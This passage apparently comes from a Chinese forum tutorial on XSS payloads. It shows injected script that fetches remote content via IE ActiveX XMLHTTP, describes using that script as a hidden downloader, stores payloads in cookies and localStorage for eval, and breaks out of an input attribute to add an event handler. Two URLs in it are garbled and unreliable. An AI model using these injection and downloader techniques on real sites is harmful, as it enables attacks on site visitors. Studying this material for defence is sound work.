
注意，重定向是发生在加载该页面的时刻，也就是说，如果百度首页的HTML被嵌入该shellcode，那么我们访问百度首页的那一刻，地址栏就会由``3c5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0i4@1f1&6i4K6R3%4i4K6S2p5i4@1f1#2i4@1q4q4i4K6W2m8i4@1f1#2i4K6V1H3i4K6V1I4i4@1f1^5i4K6R3%4i4@1t1K6N6%4N6%4i4K6u0W2k6i4k6A6L8q4)9J5k6h3y4G2L8b7.`. ``

下面这个xss payload的攻击对象为使用IE浏览器的用户，我们同样在`XssPayloadTest.html`文件的`body`元素内部添加payload，来模拟被注入的场景：

```
<!DOCTYPE html>

<html lang="en">

    <head>

        <meta http-equiv="Content-type" content="text/html;charset=utf-8" />

        <title>XssPayloadTest</title>

    </head>

    <body>

        <script>

        function XSS(){

        a = new ActiveXObject('Microsoft.XMLHTTP');

        a.open('get', 'c73K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0i4K6t1%4i4K6u0o5 false);

        a.send();

        b = a.responseText;

        document.write(b);

        }

        XSS();

        </script>

         

    </body>

</html>
```

该文件中的第8~17行即为注入的攻击载荷，第9~15行定义一个javascript函数名为

`XSS`，第10行通过“微软格式”的`XMLHTTP` request对象，创建一个IE浏览器支持的`ActiveXObject`对象，然后保存在`a`变量中；第11行通过`a`的`open`函数，以`get`方法请求百度首页，第12行实际送出请求，第13行取得保存在`a`中的响应体（通常是HTML文本），再保存到变量`b`中，注意，此时的`b`不是一个`XHR`对象，它仅仅存储了HTTP响应体中的HTML文本内容。

第14行通过`document.write`函数，将`b`，也就是HTML文本输出至当前页面，这会导致IE将HTML文本渲染成可视化的页面，最终显示百度首页。第16行实际调用`XSS`函数。

使用IE浏览器打开这个文件，攻击载荷得以被执行，由于其中创建了`ActiveXObject`对象，而IE默认禁止web页面运行ActiveX控件，单击“允许阻止的内容”，启动IE的开发者工具，定位到网络模块，可以看到，IE确实请求了百度主页并且将返回的数据写到当前页面上，注意，地址栏中的URL仍旧是`C:\Users\shayi\Desktop\XssPayloadTest.html`，因为攻击载荷使用`XMLHttpRequest`的形式发送请求，后者的特点是可以局部更新页面，不需要从HTTP请求的URL中提交完整的URL，因此当前地址栏并没有变为百度首页的URL。

![](https://bbs.kanxue.com/upload/attach/201503/533967_ff3ef34883ce6288.jpg)

黑客同样可以将“xss 大马”存储在它们搭建好的站点上，或者在受害站点注入攻击载荷，这样使用IE浏览器访问受害站点的用户将在后台隐秘地（因为使用了`XHR`对象）下载并运行xss 大马，（通过`substring`，`indexOf` 等函数截取保存在变量`b`中的攻击载荷部分，然后通过`eval`函数即可执行）

幸而IE默认禁止运行ActiveX控件，从而阻止了这段攻击载荷充当xss 大马下载器，除非你点击允许执行ActiveX控件。

关于`substring`，`indexOf`，`eval`等函数，结合`innerHTML`属性一起使用的例子，请考虑下面被注入的HTML页面源码：

```
<!DOCTYPE html>

<html lang="en">

    <head>

        <meta http-equiv="Content-type" content="text/html;charset=utf-8" />

        <title>XssPayloadTest</title>

         

    </head>

    <body>

        <h1>some innerHTML text+++alert('this part of innerHTML text will be execute as code, not strings')---end of innerHTML text</h1>

        <script>

        var htmlbodytext = document.body.innerHTML;

        var shellcodeStart = htmlbodytext.indexOf('a');

        var shellcodeEnd =  htmlbodytext.indexOf('-');

        eval(htmlbodytext.substring(shellcodeStart, shellcodeEnd));

        </script>

         

    </body>

</html>
```

上面源码中第9行的`h1`标签之间的内容，即为HTML文档体的内部HTML文本，即 `document.body.innerHTML`；第10~15行的javascript完成的任务是：首先将当前文档的内部HTML文本，即第9行的文本，存储到`htmlbodytext`变量中，然后通过`indexOf`，`substring`等函数，截取文本中从第一个`a`字符开始，到第一个减号（-）之前为止，即右圆括号“)” 之间的字符串，即字符串“`alert('this part of innerHTML text will be execute as code, not strings')`”，然后通过`eval`函数，将这个字符串当作代码执行，如果该字符串确实能被浏览器的javascript解释器解析成代码的话，那么就会弹出提示信息框。

注意上面相关的函数是如何截取字符串的。上述代码分别在三大浏览器中的测试结果如下所示：

![](https://bbs.kanxue.com/upload/attach/201503/533967_b3d6b71e73365c66.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_002cefbe8cf09707.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_88aa86d661224a1f.jpg)

也可以将XSS的攻击载荷写入当前页面的cookie中，即通过`document.cookie`进行读写，首先将shellcode写入cookie，然后读取cookie中的shellcode，通过`eval`函数将数据转换成代码即可执行。所有这些操作都可以在一个不超过10行代码的`script`标签中完成。

注意，当使用`document.cookie`进行写入时，其中的字符串数据是“增量更新”的，换言之，最新写入的字符串将添加到cookie末尾，并且以分号（;）来区分每次写入的字符串，这就需要再次利用前面介绍的`substring`与`indexOf`函数将写入的XSS攻击载荷从包含正常合法的（由受害站点设置的）cookie中截取出来，再通过`eval`函数执行。

其次，当我们在测试代码时发现：chrome浏览器的安全性最好，即便没有显式添加cookie的`HttpOnly`属性，也无法通过javascript代码读写cookie；FireFox与 IE 默认的配置都允许读写cookie；

首先看一下实现逻辑，同样假设受害站点已经将被注入的HTML页面响应给客户端，浏览器正准备渲染该页面：

```
<!DOCTYPE html>

<html lang="en">

    <head>

        <meta http-equiv="Content-type" content="text/html;charset=utf-8" />

        <title>XssPayloadTest</title>

         

    </head>

    <body>

         

        <script>

        function setshellcode(){

        var shellcodeStr = 'alert("这是存储在cookie中的shellcode被执行的效果")-';

        document.cookie = shellcodeStr;

        document.write(document.cookie);

        var origincookie = document.cookie;

        var codestart = origincookie.indexOf('a');

        var codend =  origincookie.indexOf('-');

        eval(origincookie.substring(codestart, codend));

        }

        setshellcode();

        </script>

         

    </body>

</html>
```

将上述内容保存成名为`XssPayloadTest`的html文件（与前面几个例子相同），不同的是，这次将文件的字符编码设置为UTF-8或者unicode（不要与`head`标签中的 `charset=utf-8` 混淆，后者用于告诉浏览器该HTML文档推荐使用何种字符编码进行渲染，但是文档本身的字符集没有设置成UTF-8或者unicode，还是会输出乱码的）

，因为其中有中文字符。

简单解释一下，上面代码中第12行将我们编写的攻击载荷作为字符串保存在一个变量中，第13行非常关键：将攻击载荷添加到（写入）当前页面文档的cookie末尾，如前所述，在实际攻击场景中，cookie内可能已经包含了许多由发送响应文档的站点设置的合法“名/值对”，无论是站点在发送前设置的，还是浏览器在渲染时执行攻击载荷时设置的，都会以分号区别，这就更方便我们从中提取实际要执行的内容。

第14行通过`document.write`将更新后的cookie内容显示输出至当前页面上，可以立即查看到更新后的结果。

第15~18行从cookie中提取实际的攻击载荷字符串，然后通过`eval`函数转换成指令执行。注意，我在以字符串表示的`alert`函数的右圆括号后面，添加了减号（-）字符，这样就可以通过索引函数`indexOf`准确的提取出减号前面的内容，即完整的`alert`函数。

由于在google chrome浏览器中测试上述文档时，cookie被禁止读取，导致`document.write`函数以及`eval`函数无法顺利执行，下面仅给出在FireFox以及 IE 浏览器中测试的结果，各位也可以拿360等国产浏览器测试，检查其安全性并与国际知名浏览器对比。

![](https://bbs.kanxue.com/upload/attach/201503/533967_ec9badc941977724.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_097accc29b3f2a63.jpg)

前面介绍的cookie是一种古老的客户端用户信息存储技术；近年来出台的HTML5规范中，引入了一种新的客户端存储技术，即`localStorage`，web站点同样可以将数据通过`localStorage`存储在客户端本地机器上，但是这需要客户端浏览器正确的实现了 HTML5 `localStorage` 才行，通过测试我发现 IE 浏览器并不支持这个特性，而 chrome 与 FireFox 都支持 `localStorage`。

另外，任何新协议，规范在给予开发人员便利性的同时，都难免存在安全漏洞，例如传统的cookie可以通过设置`HttpOnly`属性，阻止javascript读取其自身；而在`localStorage`中却看不到类似的安全机制。

也就是说，通过`localStorage`读写XSS攻击载荷是可行的。下面就是实现逻辑，其触发环境与前面几个例子相同，不再赘述：

```
<!DOCTYPE html>

<html lang="en">

    <head>

        <meta http-equiv="Content-type" content="text/html;charset=utf-8" />

        <title>XssPayloadTest</title>

         

    </head>

    <body>

         

        <script>

        function UseLocalStorageReadAndWriteShellcode(){

        window.localStorage.setItem("shellcode", "alert('在浏览器实现的HTML5  localStorage对象中存储并执行xss 攻击载荷')");

        eval(window.localStorage.getItem("shellcode"));

        }

        UseLocalStorageReadAndWriteShellcode();

        </script>

         

    </body>

</html>
```

任何编程语言中的自定义函数命名方式，都应该让别人一眼就能看出该函数“要做什么事”，例如上面第11行的`UseLocalStorageReadAndWriteShellcode`函数；第12行通过`localStorage`的`setItem`方法，存储XSS攻击载荷，该方法的第一个参数是攻击载荷的名称，可以随意取名；第二个参数是实际的攻击载荷字符串；

第13行使用`getItem`方法，通过名称取出攻击载荷字符串，然后再用`eval`函数将“数据”转换成“指令”执行；

第15行调用`UseLocalStorageReadAndWriteShellcode`函数，从而触发这个存储型XSS。

IE 浏览器对于HTML5规范定义的很多新特性，其支持度非常差，在IE 中渲染上述页面，10次里面有5次会直接导致IE 进程崩溃或者无响应，其它情况下，IE 的开发者工具控制台给出错误信息，提示：无法获取未定义或 `null` 引用的属性“`setItem`”

，这表明 IE （我测试的版本是11.0）不支持`localStorage`。

![](https://bbs.kanxue.com/upload/attach/201503/533967_7244eb34ece6daf1.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_179f8a9bc3d72ec0.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_7d40c593f5c3f057.jpg)

通过插入`script`标签来注入虽然很常见，但是不够隐蔽也不够“优雅”，不够效率，而使用DOM（文档对象模型）元素的事件处理程序属性来注入就显得相对有技术含量一些，至少需要用户交互才能触发预先定义的事件处理程序，从而执行其中的javascript攻击载荷，这就是所谓的 DOM based XSS 的其中一类。

假设HTML页面中有一个原始的`input`元素（输入框）如下：

```
<input type = "text" name ="search" id ="search" value = "something" class = "text_area"/>
```

其中，`value`属性后面的字符串值是用于显示在文本框内的预设字符串，在chrome中的渲染结果如下（另外2个浏览器的效果类似）：

![](https://bbs.kanxue.com/upload/attach/201503/533967_f79fce7392cf21b9.jpg)

在其`value`属性后面注入事件处理程序属性及其对应的攻击载荷的结果如下所示：

```
<input type = "text" name ="search" id ="search" value = ""onmousemove = alert('利用事件处理程序的xss!')//" class = "text_area"/>
```

对比注入前后的差异，可任意看到，通过在`value`后面的第一个双引号后再添加一个双引号，来结束`value`属性，然后插入一个新属性为`onmousemove`的事件处理程序，该事件是在用户将鼠标指针移动到文本框内部，即上面显示“`something`”字符串的文本框内时，触发预定义的javascript代码执行，后者即是我们的攻击载荷：弹出一个提示框，指出这是利用事件处理程序的XSS。

`alert`函数右圆括号后面的2个正斜杠字符，用来结束我们的javascript攻击载荷；紧接其后的双引号（第3个），对应原始`value`属性中，用于包含`something`字符串的后面那个双引号。换言之，用 `"onmousemove = alert('利用事件处理程序的xss!')//"` 替换了 `something`

chrome中的渲染结果如下（需要将鼠标指针移动进入文本框才能触发事件）：
